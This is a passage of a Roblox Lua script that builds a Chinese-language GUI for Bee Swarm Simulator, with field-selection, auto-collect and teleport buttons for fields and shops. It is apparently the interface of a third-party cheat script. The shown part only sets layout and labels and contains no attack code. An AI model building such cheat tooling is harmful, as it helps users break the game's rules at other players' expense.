CreditText.BackgroundColor3 = Color3.new(1, 1, 1)
CreditText.BackgroundTransparency = 1
CreditText.Position = UDim2.new(0.188195452, 0, 0.0601093657, 0)
CreditText.Size = UDim2.new(0.809829473, 0, 0.382513672, 0)
CreditText.Font = Enum.Font.GothamBold
CreditText.Text = "蜂群模拟器"
CreditText.TextColor3 = Color3.new(1, 1, 1)
CreditText.TextSize = 20
 
JoinText.Name = "链接文本"
JoinText.Parent = HomePage
JoinText.BackgroundColor3 = Color3.new(1, 1, 1)
JoinText.BackgroundTransparency = 1
JoinText.Position = UDim2.new(0, 0, 0.453551859, 0)
JoinText.Size = UDim2.new(0.998024881, 0, 0.146612123, 0)
JoinText.Font = Enum.Font.GothamBold
JoinText.Text = "欢迎使用"
JoinText.TextColor3 = Color3.new(1, 1, 1)
JoinText.TextSize = 17
 
DiscordlinkTest.Name = "在这里加入"
DiscordlinkTest.Parent = HomePage
DiscordlinkTest.BackgroundColor3 = Color3.new(1, 1, 1)
DiscordlinkTest.BackgroundTransparency = 1
DiscordlinkTest.Position = UDim2.new(0, 0, 0.601092875, 0)
DiscordlinkTest.Size = UDim2.new(0.998024881, 0, 0.146612123, 0)
DiscordlinkTest.Font = Enum.Font.GothamBold
DiscordlinkTest.Text = ""
DiscordlinkTest.TextColor3 = Color3.new(1, 1, 1)
DiscordlinkTest.TextSize = 17
 
Copylinkdiscord.Name = "谢谢使用"
Copylinkdiscord.Parent = HomePage
Copylinkdiscord.BackgroundColor3 = Color3.new(0.454902, 0.137255, 1)
Copylinkdiscord.BorderSizePixel = 0
Copylinkdiscord.Position = UDim2.new(0.0295858085, 0, 0.79781419, 0)
Copylinkdiscord.Size = UDim2.new(0.476331353, 0, 0.131147563, 0)
Copylinkdiscord.Font = Enum.Font.GothamBold
Copylinkdiscord.Text = "复制q群号"
Copylinkdiscord.TextColor3 = Color3.new(1, 1, 1)
Copylinkdiscord.TextSize = 14
 
FarmingPage.Name = "锻炼界面"
FarmingPage.Parent = MainPage
FarmingPage.BackgroundColor3 = Color3.new(1, 1, 1)
FarmingPage.BackgroundTransparency = 1
FarmingPage.Position = UDim2.new(-5.75803369e-08, 0, 0.127000019, 0)
FarmingPage.Size = UDim2.new(0.999777615, 0, 0.787668824, 0)
FarmingPage.Visible = false
 
FieldSelectPage.Name = "字段选择界面"
FieldSelectPage.Parent = FarmingPage
FieldSelectPage.BackgroundColor3 = Color3.new(0.482353, 0.447059, 1)
FieldSelectPage.BorderSizePixel = 0
FieldSelectPage.Position = UDim2.new(0.0228317082, 0, 0.16433613, 0)
FieldSelectPage.Size = UDim2.new(0.400000006, 0, 0.835663855, 0)
FieldSelectPage.ScrollBarThickness = 5
 
SunflowerButton.Name = "向日葵按钮"
SunflowerButton.Parent = FieldSelectPage
SunflowerButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SunflowerButton.BorderSizePixel = 0
SunflowerButton.Position = UDim2.new(0.108427808, 0, 0.0228219759, 0)
SunflowerButton.Size = UDim2.new(0, 160, 0, 20)
SunflowerButton.Font = Enum.Font.GothamBold
SunflowerButton.Text = "向日葵领域"
SunflowerButton.TextColor3 = Color3.new(1, 1, 1)
SunflowerButton.TextSize = 14
 
MushroomButton.Name = "蘑菇按钮"
MushroomButton.Parent = FieldSelectPage
MushroomButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
MushroomButton.BorderSizePixel = 0
MushroomButton.Position = UDim2.new(0.108427808, 0, 0.0791205987, 0)
MushroomButton.Size = UDim2.new(0, 160, 0, 20)
MushroomButton.Font = Enum.Font.GothamBold
MushroomButton.Text = "蘑菇领域"
MushroomButton.TextColor3 = Color3.new(1, 1, 1)
MushroomButton.TextSize = 14
 
SpiderButton.Name = "蜘蛛按钮"
SpiderButton.Parent = FieldSelectPage
SpiderButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SpiderButton.BorderSizePixel = 0
SpiderButton.Position = UDim2.new(0.108427808, 0, 0.412541032, 0)
SpiderButton.Size = UDim2.new(0, 160, 0, 20)
SpiderButton.Font = Enum.Font.GothamBold
SpiderButton.Text = "蜘蛛领域"
SpiderButton.TextColor3 = Color3.new(1, 1, 1)
SpiderButton.TextSize = 14
 
BambooButton.Name = "竹子按钮"
BambooButton.Parent = FieldSelectPage
BambooButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
BambooButton.BorderSizePixel = 0
BambooButton.Position = UDim2.new(0.108427808, 0, 0.355216533, 0)
BambooButton.Size = UDim2.new(0, 160, 0, 20)
BambooButton.Font = Enum.Font.GothamBold
BambooButton.Text = "竹子领域"
BambooButton.TextColor3 = Color3.new(1, 1, 1)
BambooButton.TextSize = 14
 
RoseButton.Name = "玫瑰按钮"
RoseButton.Parent = FieldSelectPage
RoseButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
RoseButton.BorderSizePixel = 0
RoseButton.Position = UDim2.new(0.108427808, 0, 0.524258256, 0)
RoseButton.Size = UDim2.new(0, 160, 0, 20)
RoseButton.Font = Enum.Font.GothamBold
RoseButton.Text = "玫瑰领域"
RoseButton.TextColor3 = Color3.new(1, 1, 1)
RoseButton.TextSize = 14
 
PineTreeButton.Name = "松树按钮"
PineTreeButton.Parent = FieldSelectPage
PineTreeButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
PineTreeButton.BorderSizePixel = 0
PineTreeButton.Position = UDim2.new(0.108427808, 0, 0.467443049, 0)
PineTreeButton.Size = UDim2.new(0, 160, 0, 20)
PineTreeButton.Font = Enum.Font.GothamBold
PineTreeButton.Text = "松树领域"
PineTreeButton.TextColor3 = Color3.new(1, 1, 1)
PineTreeButton.TextSize = 14
 
CactusButton.Name = "仙人掌按钮"
CactusButton.Parent = FieldSelectPage
CactusButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
CactusButton.BorderSizePixel = 0
CactusButton.Position = UDim2.new(0.108427808, 0, 0.579347968, 0)
CactusButton.Size = UDim2.new(0, 160, 0, 20)
CactusButton.Font = Enum.Font.GothamBold
CactusButton.Text = "仙人掌领域"
CactusButton.TextColor3 = Color3.new(1, 1, 1)
CactusButton.TextSize = 14
 
PumpkinButton.Name = "南瓜按钮"
PumpkinButton.Parent = FieldSelectPage
PumpkinButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
PumpkinButton.BorderSizePixel = 0
PumpkinButton.Position = UDim2.new(0.108427808, 0, 0.633908749, 0)
PumpkinButton.Size = UDim2.new(0, 160, 0, 20)
PumpkinButton.Font = Enum.Font.GothamBold
PumpkinButton.Text = "南瓜领域"
PumpkinButton.TextColor3 = Color3.new(1, 1, 1)
PumpkinButton.TextSize = 14
 
PineappleButton.Name = "松果按钮"
PineappleButton.Parent = FieldSelectPage
PineappleButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
PineappleButton.BorderSizePixel = 0
PineappleButton.Position = UDim2.new(0.108427808, 0, 0.688469529, 0)
PineappleButton.Size = UDim2.new(0, 160, 0, 20)
PineappleButton.Font = Enum.Font.GothamBold
PineappleButton.Text = "松果领域"
PineappleButton.TextColor3 = Color3.new(1, 1, 1)
PineappleButton.TextSize = 14
 
StumpButton.Name = "树墩按钮"
StumpButton.Parent = FieldSelectPage
StumpButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
StumpButton.BorderSizePixel = 0
StumpButton.Position = UDim2.new(0.108427808, 0, 0.74303031, 0)
StumpButton.Size = UDim2.new(0, 160, 0, 20)
StumpButton.Font = Enum.Font.GothamBold
StumpButton.Text = "树墩领域"
StumpButton.TextColor3 = Color3.new(1, 1, 1)
StumpButton.TextSize = 14
 
MountainTopButton.Name = "山顶按钮"
MountainTopButton.Parent = FieldSelectPage
MountainTopButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
MountainTopButton.BorderSizePixel = 0
MountainTopButton.Position = UDim2.new(0.108427808, 0, 0.797487676, 0)
MountainTopButton.Size = UDim2.new(0, 160, 0, 20)
MountainTopButton.Font = Enum.Font.GothamBold
MountainTopButton.Text = "山顶领域"
MountainTopButton.TextColor3 = Color3.new(1, 1, 1)
MountainTopButton.TextSize = 14
 
CoconutButton.Name = "椰子按钮"
CoconutButton.Parent = FieldSelectPage
CoconutButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
CoconutButton.BorderSizePixel = 0
CoconutButton.Position = UDim2.new(0.108427808, 0, 0.852136731, 0)
CoconutButton.Size = UDim2.new(0, 160, 0, 20)
CoconutButton.Font = Enum.Font.GothamBold
CoconutButton.Text = "椰子领域"
CoconutButton.TextColor3 = Color3.new(1, 1, 1)
CoconutButton.TextSize = 14
 
PepperButton.Name = "辣椒按钮"
PepperButton.Parent = FieldSelectPage
PepperButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
PepperButton.BorderSizePixel = 0
PepperButton.Position = UDim2.new(0.108427808, 0, 0.908951104, 0)
PepperButton.Size = UDim2.new(0, 160, 0, 20)
PepperButton.Font = Enum.Font.GothamBold
PepperButton.Text = "领域"
PepperButton.TextColor3 = Color3.new(1, 1, 1)
PepperButton.TextSize = 14
 
StawberryButton.Name = "草莓按钮"
StawberryButton.Parent = FieldSelectPage
StawberryButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
StawberryButton.BorderSizePixel = 0
StawberryButton.Position = UDim2.new(0.108427808, 0, 0.300172061, 0)
StawberryButton.Size = UDim2.new(0, 160, 0, 20)
StawberryButton.Font = Enum.Font.GothamBold
StawberryButton.Text = "草莓领域"
StawberryButton.TextColor3 = Color3.new(1, 1, 1)
StawberryButton.TextSize = 14
 
BlueflowerButton.Name = "蓝花按钮"
BlueflowerButton.Parent = FieldSelectPage
BlueflowerButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
BlueflowerButton.BorderSizePixel = 0
BlueflowerButton.Position = UDim2.new(0.108427808, 0, 0.135357112, 0)
BlueflowerButton.Size = UDim2.new(0, 160, 0, 20)
BlueflowerButton.Font = Enum.Font.GothamBold
BlueflowerButton.Text = "蓝花领域"
BlueflowerButton.TextColor3 = Color3.new(1, 1, 1)
BlueflowerButton.TextSize = 14
 
DanrButton.Name = "蒲公英按钮"
DanrButton.Parent = FieldSelectPage
DanrButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
DanrButton.BorderSizePixel = 0
DanrButton.Position = UDim2.new(0.108427808, 0, 0.189853355, 0)
DanrButton.Size = UDim2.new(0, 160, 0, 20)
DanrButton.Font = Enum.Font.GothamBold
DanrButton.Text = "蒲公英领域"
DanrButton.TextColor3 = Color3.new(1, 1, 1)
DanrButton.TextSize = 14
 
DanrButton_2.Name = "三叶草按钮"
DanrButton_2.Parent = FieldSelectPage
DanrButton_2.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
DanrButton_2.BorderSizePixel = 0
DanrButton_2.Position = UDim2.new(0.108427808, 0, 0.244349569, 0)
DanrButton_2.Size = UDim2.new(0, 160, 0, 20)
DanrButton_2.Font = Enum.Font.GothamBold
DanrButton_2.Text = "三叶草领域"
DanrButton_2.TextColor3 = Color3.new(1, 1, 1)
DanrButton_2.TextSize = 14
 
FieldSelectText.Name = "字段选择文本"
FieldSelectText.Parent = FarmingPage
FieldSelectText.BackgroundColor3 = Color3.new(1, 1, 1)
FieldSelectText.BackgroundTransparency = 1
FieldSelectText.Position = UDim2.new(0.0247862451, 0, 0.0436922573, 0)
FieldSelectText.Size = UDim2.new(0.398045629, 0, 0.114787988, 0)
FieldSelectText.Font = Enum.Font.GothamBlack
FieldSelectText.Text = "字段选择"
FieldSelectText.TextColor3 = Color3.new(1, 1, 1)
FieldSelectText.TextSize = 16
 
FieldText.Name = "字段文本"
FieldText.Parent = FarmingPage
FieldText.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
FieldText.BorderSizePixel = 0
FieldText.Position = UDim2.new(0.446999997, 0, 0.170000002, 0)
FieldText.Size = UDim2.new(0.530130506, 0, 0.100000001, 0)
FieldText.Font = Enum.Font.GothamBold
FieldText.Text = " 字段选择：等待中......"
FieldText.TextColor3 = Color3.new(1, 1, 1)
FieldText.TextSize = 14
FieldText.TextXAlignment = Enum.TextXAlignment.Left
 
StartButton.Name = "开始按钮"
StartButton.Parent = FarmingPage
StartButton.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
StartButton.BorderSizePixel = 0
StartButton.Position = UDim2.new(0.446999997, 0, 0.300000012, 0)
StartButton.Size = UDim2.new(0.530328393, 0, 0.100000001, 0)
StartButton.Font = Enum.Font.GothamBold
StartButton.Text = "开始收集"
StartButton.TextColor3 = Color3.new(1, 1, 1)
StartButton.TextSize = 14
 
FieldSelectText_2.Name = "字段选择文本"
FieldSelectText_2.Parent = FarmingPage
FieldSelectText_2.BackgroundColor3 = Color3.new(1, 1, 1)
FieldSelectText_2.BackgroundTransparency = 1
FieldSelectText_2.Position = UDim2.new(0.447186798, 0, 0.0436922573, 0)
FieldSelectText_2.Size = UDim2.new(0.530446231, 0, 0.114787988, 0)
FieldSelectText_2.Font = Enum.Font.GothamBlack
FieldSelectText_2.Text = "收集地位"
FieldSelectText_2.TextColor3 = Color3.new(1, 1, 1)
FieldSelectText_2.TextSize = 14
 
WaypointPage.Name = "航路点页面"
WaypointPage.Parent = MainPage
WaypointPage.BackgroundColor3 = Color3.new(1, 1, 1)
WaypointPage.BackgroundTransparency = 1
WaypointPage.Position = UDim2.new(0, 0, 0.127000034, 0)
WaypointPage.Size = UDim2.new(0, 530, 0, 174)
WaypointPage.Visible = false
WaypointPage.CanvasSize = UDim2.new(0, 0, 3, 0)
WaypointPage.ScrollBarThickness = 5
 
Suntp.Name = "传送到向日葵领域"
Suntp.Parent = WaypointPage
Suntp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Suntp.BorderSizePixel = 0
Suntp.Position = UDim2.new(0.0160000008, 0, 0.0199999996, 0)
Suntp.Size = UDim2.new(0, 120, 0, 20)
Suntp.Font = Enum.Font.GothamBold
Suntp.Text = "传送到向日葵领域"
Suntp.TextColor3 = Color3.new(1, 1, 1)
Suntp.TextSize = 14
 
Mushtp.Name = "传送到蘑菇领域"
Mushtp.Parent = WaypointPage
Mushtp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Mushtp.BorderSizePixel = 0
Mushtp.Position = UDim2.new(0.261000007, 0, 0.0199999996, 0)
Mushtp.Size = UDim2.new(0, 120, 0, 20)
Mushtp.Font = Enum.Font.GothamBold
Mushtp.Text = "传送到蘑菇领域"
Mushtp.TextColor3 = Color3.new(1, 1, 1)
Mushtp.TextSize = 14
 
Dantp.Name = "传送到蒲公英领域"
Dantp.Parent = WaypointPage
Dantp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Dantp.BorderSizePixel = 0
Dantp.Position = UDim2.new(0.510999978, 0, 0.0199999996, 0)
Dantp.Size = UDim2.new(0, 120, 0, 20)
Dantp.Font = Enum.Font.GothamBold
Dantp.Text = "传送到蒲公英领域"
Dantp.TextColor3 = Color3.new(1, 1, 1)
Dantp.TextSize = 14
 
Blueftp.Name = "传送到蓝花领域"
Blueftp.Parent = WaypointPage
Blueftp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Blueftp.BorderSizePixel = 0
Blueftp.Position = UDim2.new(0.755999982, 0, 0.0199999996, 0)
Blueftp.Size = UDim2.new(0, 120, 0, 20)
Blueftp.Font = Enum.Font.GothamBold
Blueftp.Text = "传送到蓝花领域"
Blueftp.TextColor3 = Color3.new(1, 1, 1)
Blueftp.TextSize = 14
 
Clovertp.Name = "传送到三叶草领域"
Clovertp.Parent = WaypointPage
Clovertp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Clovertp.BorderSizePixel = 0
Clovertp.Position = UDim2.new(0.0160000008, 0, 0.0599999987, 0)
Clovertp.Size = UDim2.new(0, 120, 0, 20)
Clovertp.Font = Enum.Font.GothamBold
Clovertp.Text = "传送到三叶草领域"
Clovertp.TextColor3 = Color3.new(1, 1, 1)
Clovertp.TextSize = 14
 
Bambootp.Name = "传送到竹子领域"
Bambootp.Parent = WaypointPage
Bambootp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Bambootp.BorderSizePixel = 0
Bambootp.Position = UDim2.new(0.261000007, 0, 0.0599999987, 0)
Bambootp.Size = UDim2.new(0, 120, 0, 20)
Bambootp.Font = Enum.Font.GothamBold
Bambootp.Text = "传送到竹子领域"
Bambootp.TextColor3 = Color3.new(1, 1, 1)
Bambootp.TextSize = 14
 
Spidertp.Name = "传送到蜘蛛领域"
Spidertp.Parent = WaypointPage
Spidertp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Spidertp.BorderSizePixel = 0
Spidertp.Position = UDim2.new(0.510999978, 0, 0.0599999987, 0)
Spidertp.Size = UDim2.new(0, 120, 0, 20)
Spidertp.Font = Enum.Font.GothamBold
Spidertp.Text = "传送到蜘蛛领域"
Spidertp.TextColor3 = Color3.new(1, 1, 1)
Spidertp.TextSize = 14
 
Strawtp.Name = "传送到草莓领域"
Strawtp.Parent = WaypointPage
Strawtp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Strawtp.BorderSizePixel = 0
Strawtp.Position = UDim2.new(0.755999982, 0, 0.0599999987, 0)
Strawtp.Size = UDim2.new(0, 120, 0, 20)
Strawtp.Font = Enum.Font.GothamBold
Strawtp.Text = "传送到草莓领域"
Strawtp.TextColor3 = Color3.new(1, 1, 1)
Strawtp.TextSize = 14
 
Castustp.Name = "传送到仙人掌领域"
Castustp.Parent = WaypointPage
Castustp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Castustp.BorderSizePixel = 0
Castustp.Position = UDim2.new(0.0160000008, 0, 0.100354269, 0)
Castustp.Size = UDim2.new(0, 120, 0, 20)
Castustp.Font = Enum.Font.GothamBold
Castustp.Text = "传送到仙人掌领域"
Castustp.TextColor3 = Color3.new(1, 1, 1)
Castustp.TextSize = 14
 
Pumtp.Name = "传送到南瓜领域"
Pumtp.Parent = WaypointPage
Pumtp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Pumtp.BorderSizePixel = 0
Pumtp.Position = UDim2.new(0.261000007, 0, 0.100354269, 0)
Pumtp.Size = UDim2.new(0, 120, 0, 20)
Pumtp.Font = Enum.Font.GothamBold
Pumtp.Text = "传送到南瓜领域"
Pumtp.TextColor3 = Color3.new(1, 1, 1)
Pumtp.TextSize = 14
 
Pintreetp.Name = "传送到松树领域"
Pintreetp.Parent = WaypointPage
Pintreetp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Pintreetp.BorderSizePixel = 0
Pintreetp.Position = UDim2.new(0.510999978, 0, 0.100354269, 0)
Pintreetp.Size = UDim2.new(0, 120, 0, 20)
Pintreetp.Font = Enum.Font.GothamBold
Pintreetp.Text = "传送到松树领域"
Pintreetp.TextColor3 = Color3.new(1, 1, 1)
Pintreetp.TextSize = 14
 
Rosetp.Name = "传送到玫瑰领域"
Rosetp.Parent = WaypointPage
Rosetp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Rosetp.BorderSizePixel = 0
Rosetp.Position = UDim2.new(0.755999982, 0, 0.100354269, 0)
Rosetp.Size = UDim2.new(0, 120, 0, 20)
Rosetp.Font = Enum.Font.GothamBold
Rosetp.Text = "传送到玫瑰领域"
Rosetp.TextColor3 = Color3.new(1, 1, 1)
Rosetp.TextSize = 14
 
Toptp.Name = "传送到山顶领域"
Toptp.Parent = WaypointPage
Toptp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Toptp.BorderSizePixel = 0
Toptp.Position = UDim2.new(0.755999982, 0, 0.140000001, 0)
Toptp.Size = UDim2.new(0, 120, 0, 20)
Toptp.Font = Enum.Font.GothamBold
Toptp.Text = "传送到山顶领域"
Toptp.TextColor3 = Color3.new(1, 1, 1)
Toptp.TextSize = 14
 
Coconuttp.Name = "传送到椰子领域"
Coconuttp.Parent = WaypointPage
Coconuttp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Coconuttp.BorderSizePixel = 0
Coconuttp.Position = UDim2.new(0.510999978, 0, 0.140000001, 0)
Coconuttp.Size = UDim2.new(0, 120, 0, 20)
Coconuttp.Font = Enum.Font.GothamBold
Coconuttp.Text = "传送到椰子领域"
Coconuttp.TextColor3 = Color3.new(1, 1, 1)
Coconuttp.TextSize = 14
 
Stumptp.Name = "传送到树墩领域"
Stumptp.Parent = WaypointPage
Stumptp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Stumptp.BorderSizePixel = 0
Stumptp.Position = UDim2.new(0.261000007, 0, 0.140000001, 0)
Stumptp.Size = UDim2.new(0, 120, 0, 20)
Stumptp.Font = Enum.Font.GothamBold
Stumptp.Text = "传送到树墩领域"
Stumptp.TextColor3 = Color3.new(1, 1, 1)
Stumptp.TextSize = 14
 
Pineappletp.Name = "传送到松果领域"
Pineappletp.Parent = WaypointPage
Pineappletp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Pineappletp.BorderSizePixel = 0
Pineappletp.Position = UDim2.new(0.0160000008, 0, 0.140000001, 0)
Pineappletp.Size = UDim2.new(0, 120, 0, 20)
Pineappletp.Font = Enum.Font.GothamBold
Pineappletp.Text = "传送到松果领域"
Pineappletp.TextColor3 = Color3.new(1, 1, 1)
Pineappletp.TextSize = 14
 
Peppertp.Name = "传送到辣椒领域"
Peppertp.Parent = WaypointPage
Peppertp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Peppertp.BorderSizePixel = 0
Peppertp.Position = UDim2.new(0.0160000008, 0, 0.180000007, 0)
Peppertp.Size = UDim2.new(0, 120, 0, 20)
Peppertp.Font = Enum.Font.GothamBold
Peppertp.Text = "传送到辣椒领域"
Peppertp.TextColor3 = Color3.new(1, 1, 1)
Peppertp.TextSize = 14
 
SummonSprouttp.Name = "传送到萌芽领域"
SummonSprouttp.Parent = WaypointPage
SummonSprouttp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
SummonSprouttp.BorderSizePixel = 0
SummonSprouttp.Position = UDim2.new(0.263000011, 0, 0.180000007, 0)
SummonSprouttp.Size = UDim2.new(0, 120, 0, 20)
SummonSprouttp.Font = Enum.Font.GothamBold
SummonSprouttp.Text = "传送到萌芽"
SummonSprouttp.TextColor3 = Color3.new(1, 1, 1)
SummonSprouttp.TextSize = 14
 
Coconutshoptp.Name = "传送到椰子商店"
Coconutshoptp.Parent = WaypointPage
Coconutshoptp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Coconutshoptp.BorderSizePixel = 0
Coconutshoptp.Position = UDim2.new(0.513000011, 0, 0.180000007, 0)
Coconutshoptp.Size = UDim2.new(0, 120, 0, 20)
Coconutshoptp.Font = Enum.Font.GothamBold
Coconutshoptp.Text = "传送到椰子商店"
Coconutshoptp.TextColor3 = Color3.new(1, 1, 1)
Coconutshoptp.TextSize = 14
 
Petaltp.Name = "传送到花瓣商店"
Petaltp.Parent = WaypointPage
Petaltp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Petaltp.BorderSizePixel = 0
Petaltp.Position = UDim2.new(0.755999982, 0, 0.180000007, 0)
Petaltp.Size = UDim2.new(0, 120, 0, 20)
Petaltp.Font = Enum.Font.GothamBold
Petaltp.Text = "传送到花瓣商店"
Petaltp.TextColor3 = Color3.new(1, 1, 1)
Petaltp.TextSize = 14
 
Shopproctp.Name = "传送到专业商店"
Shopproctp.Parent = WaypointPage
Shopproctp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Shopproctp.BorderSizePixel = 0
Shopproctp.Position = UDim2.new(0.263000011, 0, 0.219999999, 0)
Shopproctp.Size = UDim2.new(0, 120, 0, 20)
Shopproctp.Font = Enum.Font.GothamBold
Shopproctp.Text = "传送到专业商店"
Shopproctp.TextColor3 = Color3.new(1, 1, 1)
Shopproctp.TextSize = 14
 
Shoptoptp.Name = "传送到主打店"
Shoptoptp.Parent = WaypointPage
Shoptoptp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Shoptoptp.BorderSizePixel = 0
Shoptoptp.Position = UDim2.new(0.513000011, 0, 0.219999999, 0)
Shoptoptp.Size = UDim2.new(0, 120, 0, 20)
Shoptoptp.Font = Enum.Font.GothamBold
Shoptoptp.Text = "传送到主打店"
Shoptoptp.TextColor3 = Color3.new(1, 1, 1)
Shoptoptp.TextSize = 14
 
Shopmoontp.Name = "传送到月亮护身符商店"
Shopmoontp.Parent = WaypointPage
Shopmoontp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Shopmoontp.BorderSizePixel = 0
Shopmoontp.Position = UDim2.new(0.755999982, 0, 0.219999999, 0)
Shopmoontp.Size = UDim2.new(0, 120, 0, 20)
Shopmoontp.Font = Enum.Font.GothamBold
Shopmoontp.Text = "传送到月亮护身符商店"
Shopmoontp.TextColor3 = Color3.new(1, 1, 1)
Shopmoontp.TextSize = 14
 
Shopbasictp.Name = "传送到菜鸟商店"
Shopbasictp.Parent = WaypointPage
Shopbasictp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Shopbasictp.BorderSizePixel = 0
Shopbasictp.Position = UDim2.new(0.0160000008, 0, 0.219999999, 0)
Shopbasictp.Size = UDim2.new(0, 120, 0, 20)
Shopbasictp.Font = Enum.Font.GothamBold
Shopbasictp.Text = "传送到菜鸟商店"
Shopbasictp.TextColor3 = Color3.new(1, 1, 1)
Shopbasictp.TextSize = 14
 
Shopsprinklertp.Name = "传送到搅拌机"
Shopsprinklertp.Parent = WaypointPage
Shopsprinklertp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Shopsprinklertp.BorderSizePixel = 0
Shopsprinklertp.Position = UDim2.new(0.0160000008, 0, 0.25999999, 0)
Shopsprinklertp.Size = UDim2.new(0, 120, 0, 20)
Shopsprinklertp.Font = Enum.Font.GothamBold
Shopsprinklertp.Text = "传送到搅拌机"
Shopsprinklertp.TextColor3 = Color3.new(1, 1, 1)
Shopsprinklertp.TextSize = 14
 
InstantConversiontp.Name = "传送到即时转换器"
InstantConversiontp.Parent = WaypointPage
InstantConversiontp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
InstantConversiontp.BorderSizePixel = 0
InstantConversiontp.Position = UDim2.new(0.264773577, 0, 0.259568214, 0)
InstantConversiontp.Size = UDim2.new(0, 120, 0, 20)
InstantConversiontp.Font = Enum.Font.GothamBold
InstantConversiontp.Text = "传送到即时转换器"
InstantConversiontp.TextColor3 = Color3.new(1, 1, 1)
InstantConversiontp.TextSize = 14
 
MegaMemorytp.Name = "传送到超级记忆配对"
MegaMemorytp.Parent = WaypointPage
MegaMemorytp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
MegaMemorytp.BorderSizePixel = 0
MegaMemorytp.Position = UDim2.new(0.514773548, 0, 0.259568214, 0)
MegaMemorytp.Size = UDim2.new(0, 120, 0, 20)
MegaMemorytp.Font = Enum.Font.GothamBold
MegaMemorytp.Text = "传送到超级记忆配对"
MegaMemorytp.TextColor3 = Color3.new(1, 1, 1)
MegaMemorytp.TextSize = 14
 
NightMemorytp.Name = "传送到夜间记忆配对"
NightMemorytp.Parent = WaypointPage
NightMemorytp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
NightMemorytp.BorderSizePixel = 0
NightMemorytp.Position = UDim2.new(0.755999982, 0, 0.259568214, 0)
NightMemorytp.Size = UDim2.new(0, 120, 0, 20)
NightMemorytp.Font = Enum.Font.GothamBold
NightMemorytp.Text = "传送到夜间记忆配对"
NightMemorytp.TextColor3 = Color3.new(1, 1, 1)
NightMemorytp.TextSize = 14
 
ExtremeMemorytp.Name = "传送到极限记忆配对"
ExtremeMemorytp.Parent = WaypointPage
ExtremeMemorytp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
ExtremeMemorytp.BorderSizePixel = 0
ExtremeMemorytp.Position = UDim2.new(0.0160000008, 0, 0.300000012, 0)
ExtremeMemorytp.Size = UDim2.new(0, 120, 0, 20)
ExtremeMemorytp.Font = Enum.Font.GothamBold
ExtremeMemorytp.Text = "传送到极限记忆配对"
ExtremeMemorytp.TextColor3 = Color3.new(1, 1, 1)
ExtremeMemorytp.TextSize = 14
 
StartHalltp.Name = "传送到星光堂"
StartHalltp.Parent = WaypointPage
StartHalltp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
StartHalltp.BorderSizePixel = 0
StartHalltp.Position = UDim2.new(0.264999986, 0, 0.300000012, 0)
StartHalltp.Size = UDim2.new(0, 120, 0, 20)
StartHalltp.Font = Enum.Font.GothamBold
StartHalltp.Text = "传送到星光堂"
StartHalltp.TextColor3 = Color3.new(1, 1, 1)
StartHalltp.TextSize = 14
 
Anttp.Name = "传送到蚂蚁领域"
Anttp.Parent = WaypointPage
Anttp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Anttp.BorderSizePixel = 0
Anttp.Position = UDim2.new(0.514999986, 0, 0.300000012, 0)
Anttp.Size = UDim2.new(0, 120, 0, 20)
Anttp.Font = Enum.Font.GothamBold
Anttp.Text = "传送到蚂蚁领域"
Anttp.TextColor3 = Color3.new(1, 1, 1)
Anttp.TextSize = 14
 
Demonmasktp.Name = "传送到恶魔梅斯克领域"
Demonmasktp.Parent = WaypointPage
Demonmasktp.BackgroundColor3 = Color3.new(0.34902, 0.32549, 1)
Demonmasktp.BorderSizePixel = 0
Demonmasktp.Position = UDim2.new(0.0160000008, 0, 0.379999995, 0)
Demonmasktp.Size = UDim2.new(0, 120, 0, 20)
Demonmasktp.Font = Enum.Font.GothamBold
Demonmasktp.Text = "传送到恶魔梅斯克领域"
